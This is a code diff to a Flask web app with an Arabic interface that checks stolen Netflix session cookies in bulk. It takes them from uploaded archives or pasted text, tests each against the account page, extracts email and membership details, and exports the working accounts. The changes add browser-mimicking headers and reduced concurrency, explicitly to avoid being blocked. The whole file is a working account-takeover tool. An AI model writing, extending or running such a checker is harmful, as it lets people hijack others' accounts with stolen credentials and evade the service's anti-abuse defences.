@@ -1,5 +1,5 @@
 from flask import Flask, render_template_string, request, jsonify
-import requests, re, json, base64, os
+import requests, re, json, base64, os, time
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -22,7 +22,7 @@ HTML = r'''
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
-        .container { max-width:1000px; margin:auto; }
+        .container { max-width:1100px; margin:auto; }
         .logo { text-align:center; font-size:3.5em; font-weight:900; color:var(--red); letter-spacing:6px; margin-bottom:10px; }
         h1 { text-align:center; background:linear-gradient(135deg,var(--red),#f40612); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
         .sub { color:var(--text2); text-align:center; margin-bottom:20px; }
@@ -32,11 +32,20 @@ HTML = r'''
         .stat-val { font-size:2em; font-weight:900; }
         .stat-label { color:var(--text2); font-size:0.8em; }
         .section { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:20px 0; }
+        .two-cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+        @media (max-width:768px) { .two-cols { grid-template-columns:1fr; } }
         .upload-area {
-            border:2px dashed var(--border); border-radius:var(--radius); padding:40px 20px;
+            border:2px dashed var(--border); border-radius:var(--radius); padding:30px 20px;
             text-align:center; background:var(--input); cursor:pointer; transition:all 0.3s;
+            min-height:180px; display:flex; flex-direction:column; justify-content:center; align-items:center;
         }
         .upload-area:hover, .upload-area.dragover { border-color:var(--red); background:rgba(229,9,20,0.05); }
+        textarea {
+            width:100%; height:180px; background:var(--input); border:1px solid var(--border);
+            border-radius:var(--radius); color:var(--white); padding:15px; font-family:monospace;
+            direction:ltr; resize:vertical;
+        }
+        textarea:focus { outline:none; border-color:var(--red); }
         .btn {
             padding:12px 25px; border:none; border-radius:8px; font-weight:700; cursor:pointer;
             color:var(--white); font-family:'Cairo'; transition:all 0.3s; font-size:0.95em;
@@ -45,6 +54,7 @@ HTML = r'''
         .btn-primary { background:var(--red); }
         .btn-success { background:var(--green); }
         .btn-warning { background:#e67e22; }
+        .btn-danger { background:#c0392b; }
         .btn-outline { background:transparent; border:2px solid var(--red); color:var(--red); }
         .btn-outline:hover { background:var(--red); color:var(--white); }
         .btn:disabled { opacity:0.5; cursor:not-allowed; }
@@ -63,7 +73,7 @@ HTML = r'''
         .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
         .result-body { display:none; padding:0 15px 15px; }
         .result-body.show { display:block; }
-        .cookie-box { background:var(--input); padding:10px; border-radius:6px; font-family:monospace; direction:ltr; word-break:break-all; margin:8px 0; position:relative; }
+        .cookie-box { background:var(--input); padding:10px; border-radius:6px; font-family:monospace; direction:ltr; word-break:break-all; margin:8px 0; }
         .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin:10px 0; }
         .detail-item { background:var(--input); padding:10px; border-radius:6px; text-align:center; }
         .detail-label { color:var(--text2); font-size:0.75em; }
@@ -85,7 +95,7 @@ HTML = r'''
     <div class="container">
         <div class="logo">NETFLIX</div>
         <h1>🔍 فاحص الكوكيز المتكامل</h1>
-        <div class="sub">ارفع ملف ZIP يحتوي على كوكيز، وسيتم فحصها تلقائياً</div>
+        <div class="sub">ارفع ملفات ZIP أو الصق الكوكيز يدوياً</div>
 
         <div class="stats">
             <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
@@ -96,14 +106,26 @@ HTML = r'''
         </div>
 
         <div class="section">
-            <div class="upload-area" id="uploadArea">
-                <div style="font-size:3em">📤</div>
-                <div style="font-size:1.2em; margin:10px 0;">اسحب وأفلت ملف ZIP هنا</div>
-                <div style="color:var(--text2);">يتم استخراج جميع الكوكيز من الملفات النصية داخل الأرشيف</div>
+            <div class="two-cols">
+                <!-- عمود رفع الملفات -->
+                <div>
+                    <div style="font-weight:700; margin-bottom:10px;">📁 رفع ملفات ZIP / TXT</div>
+                    <div class="upload-area" id="uploadArea">
+                        <div style="font-size:2.5em">📤</div>
+                        <div>اسحب وأفلت الملفات هنا</div>
+                        <div style="color:var(--text2); font-size:0.8em;">يتم استخراج الكوكيز تلقائياً</div>
+                    </div>
+                    <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
+                </div>
+                <!-- عمود لصق الكوكيز -->
+                <div>
+                    <div style="font-weight:700; margin-bottom:10px;">📋 لصق الكوكيز يدوياً</div>
+                    <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا...\nكل كوكيز في سطر منفصل"></textarea>
+                </div>
             </div>
-            <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
-            <div style="text-align:center; margin-top:15px;">
-                <button class="btn btn-primary" id="btnCheck" disabled onclick="startCheck()">🚀 ابدأ الفحص</button>
+            <div style="text-align:center; margin-top:15px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
+                <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 ابدأ الفحص</button>
+                <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display:none;">⏹️ إيقاف الفحص</button>
                 <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValid()">💾 تحميل الحسابات الصالحة</button>
                 <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح الكل</button>
             </div>
@@ -126,12 +148,17 @@ HTML = r'''
         let allCookies = [];            // {cookie, source}
         let allResults = [];
         let currentFilter = 'all';
+        let abortController = null;     // للإيقاف
+        let isChecking = false;
 
         const uploadArea = document.getElementById('uploadArea');
         const fileInput = document.getElementById('fileInput');
+        const cookieTextarea = document.getElementById('cookieTextarea');
         const btnCheck = document.getElementById('btnCheck');
+        const btnStop = document.getElementById('btnStop');
         const btnDownloadValid = document.getElementById('btnDownloadValid');
 
+        // --- Upload handling ---
         uploadArea.addEventListener('click', ()=> fileInput.click());
         uploadArea.addEventListener('dragover', e=> { e.preventDefault(); uploadArea.classList.add('dragover'); });
         uploadArea.addEventListener('dragleave', ()=> uploadArea.classList.remove('dragover'));
@@ -143,7 +170,7 @@ HTML = r'''
         fileInput.addEventListener('change', e=> handleFiles(e.target.files));
 
         async function handleFiles(files) {
-            let extracted = [];
+            let count = 0;
             for (let file of files) {
                 if (file.name.endsWith('.zip')) {
                     try {
@@ -152,60 +179,83 @@ HTML = r'''
                             if (!zipEntry.dir && (filename.endsWith('.txt') || filename.endsWith('.csv'))) {
                                 const content = await zipEntry.async('string');
                                 const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
-                                lines.forEach(c => extracted.push({ cookie: c, source: filename }));
+                                lines.forEach(c => allCookies.push({ cookie: c, source: filename }));
+                                count += lines.length;
                             }
                         }
-                        showToast(`✅ تم استخراج ${extracted.length} كوكيز من ${file.name}`, 'success');
                     } catch (err) {
                         showToast(`❌ خطأ في قراءة ZIP: ${err.message}`, 'error');
                     }
                 } else if (file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
                     const content = await file.text();
                     const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
-                    lines.forEach(c => extracted.push({ cookie: c, source: file.name }));
+                    lines.forEach(c => allCookies.push({ cookie: c, source: file.name }));
+                    count += lines.length;
                 }
             }
-            if (extracted.length > 0) {
-                allCookies.push(...extracted);
-                btnCheck.disabled = false;
-                showToast(`📦 إجمالي الكوكيز المحملة: ${allCookies.length}`, 'info');
+            if (count > 0) {
+                showToast(`✅ تم تحميل ${count} كوكيز من الملفات`, 'success');
             }
         }
 
+        // --- جمع الكوكيز من كلا المصدرين ---
+        function collectAllCookies() {
+            const manualText = cookieTextarea.value.trim();
+            const manualCookies = manualText ? manualText.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('=')) : [];
+            const fileCookies = allCookies.map(c => c.cookie);
+            // دمج مع إزالة التكرارات
+            const all = [...new Set([...fileCookies, ...manualCookies])];
+            return all.map(c => ({ cookie: c, source: 'manual' }));
+        }
+
+        // --- Start / Stop ---
         async function startCheck() {
-            if (allCookies.length === 0) return;
-            btnCheck.disabled = true;
+            const cookies = collectAllCookies();
+            if (cookies.length === 0) {
+                showToast('❌ لا توجد كوكيز لفحصها. ارفع ملفات أو الصق كوكيز.', 'error');
+                return;
+            }
+
+            if (isChecking) return;
+            isChecking = true;
+            abortController = new AbortController();
+            const signal = abortController.signal;
+
+            btnCheck.style.display = 'none';
+            btnStop.style.display = 'inline-flex';
             document.getElementById('progressContainer').style.display = 'block';
             document.getElementById('resultsList').innerHTML = '';
             allResults = [];
             const startTime = Date.now();
-            const total = allCookies.length;
+            const total = cookies.length;
             let processed = 0;
-            const batchSize = 30;
+            const batchSize = 20;
 
             for (let i = 0; i < total; i += batchSize) {
-                const batch = allCookies.slice(i, i+batchSize).map(c => c.cookie).join('\n');
+                if (signal.aborted) break;
+
+                const batch = cookies.slice(i, i+batchSize).map(c => c.cookie).join('\n');
                 try {
                     const resp = await fetch('/check_multiple', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({cookies: batch})
+                        body: JSON.stringify({cookies: batch}),
+                        signal: signal
                     });
                     const data = await resp.json();
                     if (data.results) {
-                        // attach source file name
                         data.results.forEach((r, idx) => {
-                            const original = allCookies[i + idx];
-                            r.sourceFile = original ? original.source : 'unknown';
+                            r.sourceFile = 'manual';
                         });
                         allResults.push(...data.results);
                     }
                 } catch(e) {
+                    if (e.name === 'AbortError') break;
                     for (let j = i; j < Math.min(i+batchSize, total); j++) {
                         allResults.push({
                             status:'error', message:'فشل الاتصال',
-                            cookie: allCookies[j].cookie,
-                            sourceFile: allCookies[j].source,
+                            cookie: cookies[j].cookie,
+                            sourceFile: 'manual',
                             timestamp: new Date().toLocaleString()
                         });
                     }
@@ -214,19 +264,28 @@ HTML = r'''
                 const pct = Math.round(processed/total*100);
                 document.getElementById('progressFill').style.width = pct+'%';
                 document.getElementById('progressText').textContent = `فحص ${processed}/${total}`;
-                // update partial view
                 renderResults();
                 updateStats();
             }
+
             document.getElementById('statSpeed').textContent = ((Date.now()-startTime)/1000).toFixed(2)+'s';
             document.getElementById('progressContainer').style.display = 'none';
-            btnCheck.disabled = false;
+            btnCheck.style.display = 'inline-flex';
+            btnStop.style.display = 'none';
             btnDownloadValid.disabled = (allResults.filter(r=>r.status==='valid').length === 0);
+            isChecking = false;
             updateStats();
             renderResults();
-            showToast(`✅ تم فحص ${total} كوكيز`, 'success');
+            showToast(signal.aborted ? '⏹️ تم إيقاف الفحص' : `✅ تم فحص ${total} كوكيز`, signal.aborted ? 'info' : 'success');
         }
 
+        function stopCheck() {
+            if (abortController) {
+                abortController.abort();
+            }
+        }
+
+        // --- Render results (same as before) ---
         function renderResults() {
             const container = document.getElementById('resultsList');
             let filtered = currentFilter==='all' ? allResults : allResults.filter(r=> r.status===currentFilter);
@@ -253,7 +312,6 @@ HTML = r'''
                             <span class="badge ${cls}">${statusText[r.status]||'❓'}</span>
                             <span style="color:var(--text2);">#${idx+1}</span>
                             <span>${r.message||''}</span>
-                            ${r.sourceFile ? `<span style="color:var(--text2); font-size:0.8em;">(${r.sourceFile})</span>` : ''}
                         </div>
                         <span>▼</span>
                     </div>
@@ -313,7 +371,7 @@ HTML = r'''
             if (!valid.length) return showToast('لا حسابات صالحة', 'error');
             let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
             valid.forEach((r,i) => {
-                txt += `[${i+1}] المصدر: ${r.sourceFile||'?'}\n`;
+                txt += `[${i+1}]\n`;
                 txt += `الكوكيز: ${r.cookie||'(غير متوفر)'}\n`;
                 if (r.details) {
                     txt += `البريد: ${r.details.email||'?'}\n`;
@@ -350,8 +408,8 @@ HTML = r'''
         function clearAll() {
             allCookies = [];
             allResults = [];
+            cookieTextarea.value = '';
             document.getElementById('resultsList').innerHTML = '';
-            btnCheck.disabled = true;
             btnDownloadValid.disabled = true;
             updateStats();
             document.getElementById('statSpeed').textContent = '0s';
@@ -362,16 +420,37 @@ HTML = r'''
 </html>
 '''
 
-# --- Backend (unchanged) ---
+# --- Backend with improved headers and delay ---
 def check_cookie(cookie):
     try:
-        headers = {'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        r = requests.get('https://www.netflix.com/YourAccount', headers=headers, timeout=10, allow_redirects=False)
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Cookie': cookie,
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'max-age=0',
+        }
+        
+        session = requests.Session()
+        r = session.get(
+            'https://www.netflix.com/YourAccount',
+            headers=headers,
+            timeout=15,
+            allow_redirects=False
+        )
+        
         result = {
             'status':'unknown','message':'','details':{},'api_tokens':{},
             'cookie': cookie,
             'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         }
+        
         if r.status_code == 200:
             if 'membershipStatus' in r.text:
                 mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', r.text)
@@ -408,9 +487,12 @@ def check_cookie(cookie):
         elif r.status_code == 302:
             result['status'] = 'invalid'
             result['message'] = '❌ منتهية الصلاحية'
+        elif r.status_code == 403:
+            result['status'] = 'invalid'
+            result['message'] = '🚫 تم حظر الطلب'
         else:
             result['status'] = 'error'
-            result['message'] = f'⚠️ خطأ {r.status_code}'
+            result['message'] = f'⚠️ رمز الحالة: {r.status_code}'
         return result
     except Exception as e:
         return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -426,7 +508,8 @@ def check_multiple():
     if not cookies: return jsonify({'status':'error'})
     lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
     results = []
-    with ThreadPoolExecutor(max_workers=10) as ex:
+    # استخدام عدد أقل من العمال لتجنب الحظر (5 بدلاً من 10)
+    with ThreadPoolExecutor(max_workers=5) as ex:
         futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
         for f in as_completed(futs):
             try:
@@ -435,6 +518,7 @@ def check_multiple():
                 results.append(res)
             except: pass
     results.sort(key=lambda x: x.get('index',0))
+    # تأخير بسيط بين الدفعات (يتم التعامل معه في الجافاسكريبت)
     return jsonify({'results':results})
 
 if __name__ == '__main__':
